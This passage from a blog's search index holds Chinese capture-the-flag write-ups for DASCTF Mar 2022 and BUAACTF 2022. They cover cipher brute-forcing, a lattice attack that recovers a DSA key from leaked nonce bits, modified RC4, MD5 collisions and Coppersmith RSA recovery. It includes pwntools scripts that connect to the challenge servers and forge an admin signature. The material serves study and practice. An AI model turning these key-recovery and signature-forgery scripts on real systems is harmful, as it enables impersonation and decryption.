{"pages":[{"title":"board","text":"","link":"/board/index.html"},{"title":"about","text":"About me太懒了，不想写 想联系我： 扫描下方二维码 wechar或alipay都行 (●’◡’●)","link":"/about/index.html"}],"posts":[{"title":"2022 DASCTF Mar Writeup","text":"2022 DASCTF Mar Writeup没时间打这比赛，赛后看看大佬的wp学习学习 CryptoFlowerCipher题目描述 123456789101112131415161718192021222324# python3from secret import flagimport random# flag = b'flag{%s}' % md5(something).hexdigest()# note that md5 only have characters 'abcdef' and digitsdef Flower(x, key): flower = random.randint(0, 4096) return x * (key ** 3 + flower)flag = flag[5:-1]rounds = len(flag)L, R = 1, 0for i in range(rounds): L, R = R + Flower(L, flag[i]), Lprint(L, R)'''15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003''' L,R= R_{pre}+L_{pre}*({Key}^3+randint),L_{pre}\\\\ R_pre=L\\%R爆破randint和key即可得到flag 1234567891011121314151617L=15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 R=139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003table=[48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102]flag=[]while L!=1 and R!=0: for rand_i in range(4096): for flag_i in table: if L%R==L-(R*(flag_i**3+rand_i)): flag.append(flag_i) L,R=R,L%R break if len(flag)==32: breakt=''for i in flag: t+=chr(i)print(t[::-1]) 其它解法1)究极暴力解法(29条消息) DASCTF X SU-2022-Crypto-FlowerCipher之暴力暴力求解法(z3约束器)_Mango|Feng的博客-CSDN博客 2)开三次根模拟，更为高效 12345678910111213import gmpy2L = 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899R = 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003flag = ''while L != 1: s = L%R tmp = (L-R)//R flag_b = gmpy2.iroot(tmp,3)[0] flag += chr(flag_b) L = R R = sprint('flag{'+flag[::-1]+'}') meet me in the middle从密钥中泄露的部分位恢复出全部密钥 题目描述： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183from Crypto.Util.number import *from hashlib import sha256import socketserverimport signalimport stringfrom Crypto.Random import randomfrom Crypto.PublicKey import DSAtable = string.ascii_letters + string.digitsBANNER = br'''888b d888 888 888b d888 8888b d8888 888 8888b d8888 88888b.d88888 888 88888b.d88888 888Y88888P888 .d88b. .d88b. 888888 888Y88888P888 .d88b. 888 Y888P 888 d8P Y8b d8P Y8b 888 888 Y888P 888 d8P Y8b 888 Y8P 888 88888888 88888888 888 888 Y8P 888 88888888 888 &quot; 888 Y8b. Y8b. Y88b. 888 &quot; 888 Y8b. 888 888 &quot;Y8888 &quot;Y8888 &quot;Y888 888 888 &quot;Y8888 8888888 888 888 888b d888 d8b 888 888 888 888 888 888 8888b d8888 Y8P 888 888 888 888 888 888 88888b.d88888 888 888 888 888 88888b. 888888 88888b. .d88b. 888Y88888P888 888 .d88888 .d88888 888 .d88b. 888 888 &quot;88b 888 888 &quot;88b d8P Y8b 888 Y888P 888 888 d88&quot; 888 d88&quot; 888 888 d8P Y8b 888 888 888 888 888 888 88888888 888 Y8P 888 888 888 888 888 888 888 88888888 888 888 888 Y88b. 888 888 Y8b. 888 &quot; 888 888 Y88b 888 Y88b 888 888 Y8b. 8888888 888 888 &quot;Y888 888 888 &quot;Y8888 888 888 888 &quot;Y88888 &quot;Y88888 888 &quot;Y8888 '''class DigitalSignatureAlgorithm: def __init__(self, key): self.p = key.p self.q = key.q self.g = key.g self.y = key.y self.x = key.x self.k = [] def sign(self, m): k = random.StrongRandom().randint(1, self.q - 1) self.k.append(k) h = bytes_to_long(sha256(m).digest()) r = pow(self.g, k, self.p) % self.q s = inverse(k, self.q) * (h + self.x * r) % self.q return r, s def verify(self, m, signature): r, s = signature if (not (1 &lt;= r &lt;= self.q - 1)) or (not (1 &lt;= s &lt;= self.q - 1)): return False z = bytes_to_long(sha256(m).digest()) w = inverse(s, self.q) u1 = (z * w) % self.q u2 = (r * w) % self.q v = (pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p % self.q return r == vmyDSA = DigitalSignatureAlgorithm(DSA.generate(1024))MENU = br'''[1] Sign.[2] Verify.[3] Get_public_key.[4] Get_sth_in_the_middle[5] Exit.'''class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self, prompt=b'[-] '): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (''.join([random.choice(table) for _ in range(12)])).encode() sha = sha256(proof).hexdigest().encode() self.send(b&quot;[+] sha256(XXXX+&quot; + proof[4:] + b&quot;) == &quot; + sha) XXXX = self.recv(prompt=b'[+] Plz Tell Me XXXX :') if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def sign(self): m1 = b'What you want to know' m2 = b'My dear lone warrior' signature1 = myDSA.sign(m1) signature2 = myDSA.sign(m2) self.send(b'Your signature1 is:' + str(signature1).encode()) self.send(b'Your signature2 is:' + str(signature2).encode()) def verify(self): m = self.recv(b'message:') r = int(self.recv(b'r:')) s = int(self.recv(b's:')) signature = (r, s) if m == b&quot;I'm Admin.I want flag.&quot;: if myDSA.verify(m, signature): self.send(b'Hello there.This is what you want.') flag = open('flag').read() self.send(flag.encode()) else: self.send(b'Who are U?Get out!') return False else: self.send(b'Who are U?Get out!') def get_public_key(self): self.send(b'p = ' + str(myDSA.p).encode()) self.send(b'q = ' + str(myDSA.q).encode()) self.send(b'g = ' + str(myDSA.g).encode()) self.send(b'y = ' + str(myDSA.y).encode()) def sth_in_the_middle(self): if len(myDSA.k) == 2: middle_k0 = int(bin(myDSA.k[0])[2:][30:-30], 2) &lt;&lt; 30 middle_k1 = int(bin(myDSA.k[1])[2:][30:-30], 2) &lt;&lt; 30 self.send(b'middle_k0' + str(middle_k0).encode()) self.send(b'middle_k1' + str(middle_k1).encode()) else: self.send(b&quot;The time has not come.&quot;) def handle(self): signal.alarm(60) self.send(BANNER) if not self.proof_of_work(): self.send(b'Oops,you are wrong. Bye~') self.request.close() while 1: self.send(MENU) option = int(self.recv(prompt=b'Give me your option:')) if option == 1: self.sign() elif option == 2: self.verify() break elif option == 3: self.get_public_key() elif option == 4: self.sth_in_the_middle() else: break self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 5000 print(&quot;HOST:POST &quot; + HOST + &quot;:&quot; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 题解没太看懂，大概是通过格基找到最小解，从而恢复密钥（格密码还要学习学习…） 相关论文：1506.pdf (iacr.org) 复制一篇dl的代码学习 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceimport itertoolsfrom Crypto.Util.number import *table = string.ascii_letters+string.digitsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) #最高次项系数化为0 f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i #收集基多项式 for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) print(G) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []def passpow(): io.recvuntil(b&quot;XXXX+&quot;) suffix = io.recv(8).decode(&quot;utf8&quot;) print(suffix) io.recvuntil(b&quot; == &quot;) cipher = io.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method='fixed') io.recvuntil('[+] Plz Tell Me XXXX :') io.sendline(proof.encode()) def sign(m): k = randint(1,q - 1) h = bytes_to_long(sha256(m).digest()) print(f'h = {h}') r = pow(g,k,p) % q s = inverse(k,q) * (h + x * r) % q return r, sio = remote(&quot;node4.buuoj.cn&quot;,26760)passpow()io.recvuntil(&quot;Give me your option:&quot;)io.sendline('3')temp = io.recvline().decode()print(temp)p = int(temp[3:])print(p)temp = io.recvline().decode()print(temp)q = int(temp[3:])print(q)temp = io.recvline().decode()print(temp)g = int(temp[3:])print(g)temp = io.recvline().decode()print(temp)y = int(temp[3:])print(y)io.recvuntil(&quot;Give me your option:&quot;)io.sendline('1')temp = io.recvline()[19:]print(temp)(r1,s1) = eval(temp)print((r1,s1))temp = io.recvline()[19:]print(temp)(r2,s2) = eval(temp)print((r2,s2))io.recvuntil(&quot;Give me your option:&quot;)io.sendline('4')temp = io.recvline()print(temp)mid_k1 = int(temp[9:])print(mid_k1)temp = io.recvline()print(temp)mid_k2 = int(temp[9:])print(mid_k2)h1 = 5440870519694256980135324401094468206014287406674503181088652055917252477781h2 = 90448073438206215877225095258876093094467988960968110779111950984480430764205t = -inverse_mod(s1,q)*s2*r1*inverse_mod(r2,q)u = inverse_mod(s1,q)*r1*h2*inverse_mod(r2,q)-inverse_mod(s1,q)*h1PR.&lt;x1,x2,x3,x4&gt; = PolynomialRing(Zmod(q))c = 1&lt;&lt;130bound = 1&lt;&lt;30f = (x1+mid_k1+c*x2)+t*(x3+mid_k2+c*x4)+uprint(f)ans = small_roots(f,(bound,bound,bound,bound),m=3,d=2)[0]print(ans)k1 = ans[0]+mid_k1+c*ans[1]k2 = ans[2]+mid_k2+c*ans[3]print(f'k1 = {k1} ,k2 = {k2}')x = (s1*k1-h1)*inverse_mod(r1,q)%qmessage = b&quot;I'm Admin.I want flag.&quot;to_send = sign(message)io.recvuntil(&quot;Give me your option:&quot;)io.sendline('2')io.recvuntil(&quot;message:&quot;)io.sendline(b&quot;I'm Admin.I want flag.&quot;)io.recvuntil('r')io.sendline(str(to_send[0]).encode())io.recvuntil('s')io.sendline(str(to_send[1]).encode())io.interactive()# from https://phot0n.com/2022/03/29/DASCTF-2022/ Reverseeasyre带壳，用的万能脱壳工具脱掉壳（脚本小子(lll￢ω￢)） 进到main函数 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ _BYTE v3[50]; // [esp+1Ch] [ebp-74h] BYREF _BYTE v4[50]; // [esp+4Eh] [ebp-42h] BYREF _DWORD v5[3]; // [esp+80h] [ebp-10h] BYREF int v6; // [esp+8Ch] [ebp-4h] sub_40DCF0(); sub_41A070(v5); v6 = sub_41A078(v5); sub_47C7D0(&amp;dword_487F00, v4); if ( strlen((int)v4) != 42 ) exit(&amp;dword_488140, aWrong); if ( v4[0] == 'D' &amp;&amp; v4[1] == 'A' &amp;&amp; v4[2] == 'S' &amp;&amp; v4[3] == 'C' &amp;&amp; v4[4] == 'T' &amp;&amp; v4[5] == 'F' ) { sub_41A080((int)v3, (int)v4); v5[2] = *(_DWORD *)(v6 + 20) + 1900; v5[1] = 0; sub_4019BE((int)v4); //base58 sub_401771((int)v3); //加密 } exit(&amp;dword_488140, aWrong);} 关键函数是sub_401771 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364void __cdecl __noreturn sub_401771(int a1){ int v1[50]; // [esp+1Ch] [ebp-DCh] BYREF int v2; // [esp+E4h] [ebp-14h] int j; // [esp+E8h] [ebp-10h] int i; // [esp+ECh] [ebp-Ch] v2 = strlen(a1); sub_401500(); sub_40152B(); sub_401593(); // KSA sub_401619(a1, v2); for ( i = 0; i &lt; v2; ++i ) byte_492A60[i] = (LOBYTE(dword_492940[i]) ^ *(_BYTE *)(i + a1)) + 71; memset(v1, 0, sizeof(v1)); v1[0] = -61; v1[1] = -128; v1[2] = -43; v1[3] = -14; v1[4] = -101; v1[5] = 48; v1[6] = 11; v1[7] = -76; v1[8] = 85; v1[9] = -34; v1[10] = 34; v1[11] = -125; v1[12] = 47; v1[13] = -105; v1[14] = -72; v1[15] = 32; v1[16] = 29; v1[17] = 116; v1[18] = -47; v1[19] = 1; v1[20] = 115; v1[21] = 26; v1[22] = -78; v1[23] = -56; v1[24] = -59; v1[25] = 116; v1[26] = -64; v1[27] = 91; v1[28] = -9; v1[29] = 15; v1[30] = -45; v1[31] = 1; v1[32] = 85; v1[33] = -78; v1[34] = -92; v1[35] = -82; v1[36] = 123; v1[37] = -84; v1[38] = 92; v1[39] = 86; v1[40] = -68; v1[41] = 35; for ( j = 0; j &lt;= 41; ++j ) { if ( v1[j] != byte_492A60[j] ) sub_41A060(0); } exit(&amp;dword_488140, aRight);} v1就是我们最终的目标密文 点进去前面的几个函数，发现其实是魔改过的RC4加密，sub_401593及之前的函数对应KSA部分，主要修改过的是sub_401593部分 进到sub_401619，该部分用于生成最终的密钥流 1234567891011121314151617181920212223242526272829bool __cdecl sub_401619(int a1, int a2){ int v2; // eax bool result; // al int v4; // [esp+10h] [ebp-10h] int v5; // [esp+14h] [ebp-Ch] int j; // [esp+18h] [ebp-8h] int i; // [esp+1Ch] [ebp-4h] v5 = 0; j = 0; for ( i = 0; ; dword_492940[v5++] = s[(s[j] + s[i]) % 256] ) { v2 = a2--; result = v2 != 0; if ( !result ) break; i = (i + 1) % 256; j = (j + s[i]) % 256; v4 = s[i] + 66; s[i] = s[j] - 33; s[i] ^= 2u; s[j] = 5 * v4; s[j] = s[i] - 10; s[j] += s[i]; s[i] -= 18; } return result;} 主要是进行了一些奇怪的运算，由于流密码的特点我们并不需要对算法做逆向，照着生成密钥流即可 最终exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293def KSA(key):#密钥编排算法，完成S和T的初始化以及S的初始置换 length=len(key) s=[] t=[] for i in range(256): s.append(i) t.append(key[i%length]) j=0 for i in range(256): j=(j+s[i]+t[i])%256 s[i],s[j]=s[j],s[i] return sdef generate_key(s,data):#利用置换后的s产生密钥流 i,j=0,0 k=[] for l in range(len(data)): i=(i+1)%256 j=(j+s[i])%256 v4=s[i]+66 s[i]=(s[j]-33)^2 s[j]=s[i]-10+s[i] s[i]-=18 t=(s[i]+s[j])%256 k.append(s[t]) return kdef Xor(key,data):#用于两个数组间的异或操作 for i in range(len(data)): data[i]^=key[i] return datadef encrypt(data,key):#加密主函数 s=KSA(key) key=generate_key(s,data) result=Xor(key,data) return resultdef decrypt(cipher,key):#解密主函数，由于加密仅是异或操作，此处仅再次调用加密函数即可 result=encrypt(cipher,key) return resulta=[0]*42a[0] = 0xFFFFFFC3a[1] = 0xFFFFFF80a[2] = 0xFFFFFFD5a[3] = 0xFFFFFFF2a[4] = 0xFFFFFF9Ba[5] = 0x30a[6] = 0xBa[7] = 0xFFFFFFB4a[8] = 0x55a[9] = 0xFFFFFFDEa[10] = 0x22a[11] = 0xFFFFFF83a[12] = 0x2Fa[13] = 0xFFFFFF97a[14] = 0xFFFFFFB8a[15] = 0x20a[16] = 0x1Da[17] = 0x74a[18] = 0xFFFFFFD1a[19] = 1a[20] = 0x73a[21] = 0x1Aa[22] = 0xFFFFFFB2a[23] = 0xFFFFFFC8a[24] = 0xFFFFFFC5a[25] = 0x74a[26] = 0xFFFFFFC0a[27] = 0x5Ba[28] = 0xFFFFFFF7a[29] = 0xFa[30] = 0xFFFFFFD3a[31] = 1a[32] = 0x55a[33] = 0xFFFFFFB2a[34] = 0xFFFFFFA4a[35] = 0xFFFFFFAEa[36] = 0x7Ba[37] = 0xFFFFFFACa[38] = 0x5Ca[39] = 0x56a[40] = 0xFFFFFFBCa[41] = 0x23for i in range(len(a)): a[i]=(a[i]-71)%256key=[49, 50, 51, 52, 53, 54]flag=decrypt(a,key)f=''for i in flag: f+=chr(i&amp;0x7f)print(f)# DASCF{Welc0me-t0%j01n-SU#l0ve-suyuS1Qg1e} 奇怪的是最终生成的flag有几位不太对…. 看了一下dl的正确flag是DASCTF{Welc0me-t0-j01n-SU-l0ve-suyug1eg1e} 然后看了一下别人的做法，比较好的是动态调试进到内存中直接调取生成的密钥流，可惜工具脱壳后exe不能运行了，没法调试","link":"/2022/04/05/2022-DASCTF-Mar-Writeup/"},{"title":"BUAACTF 2022 WP","text":"Writeup of BUAACTF 2022​ Vergissmeinnicht [toc] Web召唤神龙从蝌蚪到龙的每个阶段的图片上都有一个字符，记录下来再拼在一起，就可以得到flag了。 Cryptopow工作量证明机制，对前四位进行爆破即可 123456789101112131415161718def get_pow(know,set): table= ['A', 'B', 'C', 'D','E','F','G','H','I','J','K' ,'L','M','N','O','P','Q','R','S','T','U','V','W','X','Y' ,'Z','a', 'b', 'c', 'd','e','f','g','h','i','j','k','l','m','n','o','p' ,'q','r','s','t','u','v','w','x','y','z','0', '1', '2', '3','4','5','6','7','8','9','+', '/', '='] unknown='' for i1 in table: for i2 in table: for i3 in table: for i4 in table: unknown=i1+i2+i3+i4 hash=hashlib.md5((unknown+know).encode()).hexdigest().encode() # print(hash) if hash==set: return unknown print('?') print(get_pow('fJLX15llIkiMm2ip',b'b43e5db2f4e18ee210cc18376c443883')) ez_game题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import socketserverfrom time import sleepfrom hashlib import md5from gmpy2 import invertfrom Crypto.Util.number import getPrimefrom random import randintfrom secret import flagMENU = br'''[+] Let's play games!Which game would y like to play?[+] 1. Plz find invert(a,m) when a and m is given(300 asks)[+] 2. Plz find a pair of 'x'and'y' that satisfying x!=y &amp;&amp; md5(x)===md5(y)'''class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self, prompt=b'[-] '): self.send(prompt, newline=False) return self._recvall() def handle(self): self.send(MENU, newline=False) self.send(b&quot;[+] Plz give me your choice: &quot;) ans = int(self.recv().strip().decode()) if ans == 1: for i in range(300): a = m = 1 while a % m == 0 or m % a == 0: a = randint(2,2**8) m = getPrime(6) self.send((&quot;[+] Here is your (a, m): (%s, %s)&quot; % (a, m)).encode()) self.send(b&quot;[+] Plz give me your answer: &quot;) ans = int(self.recv().strip().decode()) if ans != invert(a, m): self.send(b'[!] oops!') break if i == 299: self.send(b'[!] ' + flag[:16]) elif ans == 2: self.send(b&quot;[+] Plz give me your x: &quot;) x = self.recv() self.send(b&quot;[+] Plz give me your y: &quot;) y = self.recv() if (x == y) or (md5(x).hexdigest() != md5(y).hexdigest()): self.send(b'[!] oops!') else: self.send(b'[!] ' + flag[16:]) else: self.send(b'[!] oops!') self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 43089 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 分为两部分，第一部分是重复三百次的求逆运算，用pwntools处理一下；另一部分是找一对md5值相同的碰撞文件，这个可以使用md5碰撞脚本来生成，或者上网找一下md5值相同的文件。 123456789101112131415from pwn import*f1=open('test1','rb').read()f2=open('test2','rb').read()# print(f1)# print(f2)a=remote('101.43.185.64' ,'43089')a.sendlineafter(b'md5(x)===md5(y)',b'2')a.send(f1)sleep(1)a.send(f2)# sleep(1)print(a.recv())a.interactive() 123456789101112131415161718192021222324252627from pwn import*from gmpy2 import invertf1=open('test1','rb').read()f2=open('test2','rb').read()# print(f1)# print(f2)a=remote('101.43.185.64' ,'43089')a.sendlineafter(b'Plz give me your choice:',b'1')for i in range(300): num1='' num2='' a.recvuntil(b&quot;Here is your (a, m): &quot;) gstr=a.recvuntil(b&quot;)&quot;).decode() j=1 while(gstr[j]!=','): num1+=gstr[j] j+=1 j+=1 while(gstr[j]!=')'): num2+=gstr[j] j+=1 # print(num1,num2) m=invert(int(num1),int(num2)) a.sendafter(b&quot; Plz give me your answer: &quot;,str(m).encode())# print(gstr)a.interactive() chaos_generator题目描述： 123456789101112131415161718192021222324252627282930313233from libnum import s2nfrom gmpy2 import next_primefrom random import randintfrom secret import flagdef chaos_maker(p, g, seed): res = 0 x = seed for _ in range(randint(0, 114514)): x = pow(g, x, p) for i in range(256): x = pow(g, x, p) if x &lt; (p-1) // 2: res -= (1 &lt;&lt; i) - 1 elif x &gt; (p-1) // 2: res += (1 &lt;&lt; i) + 1 else: res ^= (1 &lt;&lt; i + 1) return res if res &gt; 0 else -resdef keygen(p, g): u, v = chaos_maker(p, g, randint(0, 1&lt;&lt;64)), chaos_maker(p, g, randint(0, 1&lt;&lt;64)) return next_prime(u**2 + v**2) * next_prime(2*u*v)p = 74318463376311964657848870236469351222861371046000989980725143814597652972079g = 10135979321704650132001133858909900216529170765388975908180263641843583056994N = keygen(p, g)print(N)# N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963e = 65537c = pow(s2n(flag), e, N)print(c)# c = 23334367507777982721463578689282517343702422017568936413397591619899938216343800551132594869485665306596562901129144338015710969994575939792628945297846703002122172051500112438041566171992504143239954624689779597268840813422509867439815100802585538453946245512563984478922752113443379737653491922857109660034 一道随机数生成器的题目，看算法没啥漏洞，关键在于选取的种子。 检测一下，种子g的阶仅为28361，也就是说经随机数算法生成的随机数总数至多只有28361个，而事实上经脚本爆破后，该随机数生成器的所有随机数只有10000多个。（注意对生成算法稍微修改以提高效率） 123456789101112131415161718192021222324252627p = 74318463376311964657848870236469351222861371046000989980725143814597652972079g = 10135979321704650132001133858909900216529170765388975908180263641843583056994#2*2137*2371544062167676680393339695580229344063914545013798761857806186673744281N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963# 28362def chaos_maker(p, g, seed): res = 0 x = seed for i in range(256): x = pow(g, x%28361, p) if x &lt; (p-1) // 2: res -= (1 &lt;&lt; i) - 1 elif x &gt; (p-1) // 2: res += (1 &lt;&lt; i) + 1 else: res ^= (1 &lt;&lt; i + 1) return res if res &gt; 0 else -resdef Boom(): pos=[] for i in range(28362): t=chaos_maker(p,g,i) if t not in pos: pos.append(t) return pospos=Boom()print(len(pos))open('111.txt','w').write(str(pos))# print(pow(g,28361,p)) 然后对这一万多种情况搜索生成N所对应的u、v，注意这里需要替换next_prime函数，否则运行效率感人 123456789101112131415N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963min=Nans1=0ans2=0for i in range(len(a)): for j in (range(i+1,len(a))): tmp=(a[i]**2+a[j]**2)*(2*a[i]*a[j]) if abs(N-tmp)&lt;min: ans1=a[i] ans2=a[j] min=abs(N-tmp)print('end')print(ans1,ans2,N-(ans1**2+ans2**2)*(2*ans1*ans2))# s=next_prime(u**2 + v**2) * next_prime(2*u*v)# print(next_prime(2*u*v),N-s) 12345678p=5776606591131731176687221654555806721589749446513729573168881347635227133113794767302741712092017955351737968930616386238529534813063208506333298381433797c = 23334367507777982721463578689282517343702422017568936413397591619899938216343800551132594869485665306596562901129144338015710969994575939792628945297846703002122172051500112438041566171992504143239954624689779597268840813422509867439815100802585538453946245512563984478922752113443379737653491922857109660034q=N//pe=65537phi=(p-1)*(q-1)d=inverse(e,phi)print(pow(c,d,N))print(n2s(198974677777462547987961272550160914376798574897551434087880206096406625475032831179901)) flag{U_g&amp;5-th3_BA51cs_MY_PaDawan&gt;_&lt;} easyrsa题目描述： 12345678910111213141516171819202122232425262728293031323334from libnum import n2s, s2nfrom random import randrangefrom Crypto.Util.Padding import padfrom Crypto.Util.number import *flag = pad(b'BUAACTF{******************}', 48)def gen(): e = 3 while True: try: p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = inverse(e,phi) if d == 1: continue return p,q,d,n,e except: continue returnp,q,d,n,e = gen()c = pow(s2n(flag), e, n)print(&quot;n = %d&quot;%n)print(&quot;e = %d&quot;%e)print(&quot;c = %d&quot;%c)print(&quot;mbar = %d&quot;%(s2n(flag[:len(flag) // 2]) &lt;&lt; 192))# n = 81990486158830819987073862172415164961593278461441199000999472465202518599850332550812125141470698747706547832071653895197966292731285323989845213159146261837803561813706450672725878328449137240949801181034766354744732582372151328001276074276010039350214840101550595192803830418941509645225250637084951191901# e = 3# c = 29567745406946076830146052374930033424211480116321544674448562777091588294881623860014915348606939136520110465290092616212926800744828796888106944346222024613999754846412634549763305673101149427233979469362411909357450400895307369148973536710380608978693814012874175410588472106640257194122351943446376090522# mbar = 10209587263099434303402268295264783241039304732220412954880929680985232124926643894842588590120872193397691703623680 copper-smith攻击，加密指数仅为3，且泄露了一部分明文，网上直接找个脚本跑就行了 12345678910111213141516171819n = 81990486158830819987073862172415164961593278461441199000999472465202518599850332550812125141470698747706547832071653895197966292731285323989845213159146261837803561813706450672725878328449137240949801181034766354744732582372151328001276074276010039350214840101550595192803830418941509645225250637084951191901e = 3m = randrange(n)c = pow(m, e, n)beta = 1epsilon = beta^2/7nbits = n.nbits()kbits = floor(nbits*(beta^2/e-epsilon)) mbar = 10209587263099434303402268295264783241039304732220412954880929680985232124926643894842588590120872193397691703623680c=29567745406946076830146052374930033424211480116321544674448562777091588294881623860014915348606939136520110465290092616212926800744828796888106944346222024613999754846412634549763305673101149427233979469362411909357450400895307369148973536710380608978693814012874175410588472106640257194122351943446376090522print (&quot;upper %d bits (of %d bits) is given&quot; % (nbits-kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = n1print (mbar + x0)# BUAACTF{Y0u_Know_c0ppersmit_s0_w3ll!!@#$#%~!@!} Block?题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from secret import flagfrom libnum import s2ns = [0x7, 0x4, 0x9, 0xc, 0xb, 0xa, 0xd, 0x8, 0xf, 0xe, 0x1, 0x6, 0x0, 0x3, 0x2, 0x5]PL1 = [1, 3, 4, 6, 0, 2, 7, 5]PR1 = [2, 7, 5, 0, 1, 6, 4, 3]def leftrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &lt;&lt; num) ^ (left &gt;&gt; 32 - num)) &amp; 0xffffffff r = ((right &lt;&lt; num) ^ (right &gt;&gt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef S(x, bit): after_sbox = 0 for i in range(bit): after_sbox ^= (s[(x &gt;&gt; i * 4) &amp; 0xf] &lt;&lt; i * 4) return after_sboxdef PL(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[PL1[i]] &lt;&lt; (7 - i) * 8) return resdef PR(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[PR1[i]] &lt;&lt; (7 - i) * 8) return resdef encrypt(x, K): x0, x1 = x &gt;&gt; 64, x &amp; 0xffffffffffffffff rk0, rk1 = K &gt;&gt; 64, K &amp; 0xffffffffffffffff x0 = S(x0 ^ rk0, 128 // 8) x1 = S(x1 ^ rk1, 128 // 8) x1 = (x1 ^ x0) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 4)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 8)) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 8)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 20)) &amp; 0xffffffffffffffff x0 = (x0 ^ x1) &amp; 0xffffffffffffffff x0 = PL(x0) x1 = PR(x1) Y = (x0 &lt;&lt; 64) ^ x1 return Yif __name__ == '__main__': x = 0x0123456789abcdeffedcba9876543210 key1, key2 = s2n(flag[:len(flag) // 2]), s2n(flag[len(flag) // 2:]) cipher1 = encrypt(x, key1) cipher2 = encrypt(x, key2) print('plaintext =' + hex(x)) print('ciphertext1 =' + hex(cipher1)) print('ciphertext2 =' + hex(cipher2))# plaintext = 0x0123456789abcdeffedcba9876543210# 